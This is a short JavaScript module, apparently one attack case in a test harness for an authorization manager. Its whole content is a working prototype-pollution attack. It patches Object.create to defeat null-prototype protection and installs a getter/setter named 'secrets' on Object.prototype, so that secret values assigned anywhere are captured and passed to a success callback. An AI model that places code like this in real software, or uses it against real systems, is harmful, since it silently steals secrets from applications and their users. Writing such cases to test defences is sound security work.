let stolen;

// Remove the functionality of accepting null prototype
const { create } = Object;
Object.create = (proto, props) => create(proto || {}, props);

Object.defineProperty(Object.prototype, "secrets", {
  get: () => stolen,
  set: (v) => {
    stolen = v;
  }
});

export const attack = (_authzManager, success) => {
  if (stolen) {
    success(stolen);
  }
};
